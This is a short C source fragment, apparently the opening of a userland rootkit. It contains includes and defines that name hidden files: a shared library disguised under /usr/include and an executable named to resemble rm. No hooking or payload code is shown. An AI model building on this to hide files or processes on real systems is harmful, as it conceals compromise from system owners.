#define _GNU_SOURCE

#define __i386__
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <syscall.h>

#define HIDDEN_PATH "/usr/include/usermode.so"
#define HIDDEN_EXEC_PATH "/usr/bin/rm_s"
#define HIDDEN_FILENAME "rm_s"
#define HIDDEN_FILENAME2 "usermode.so"

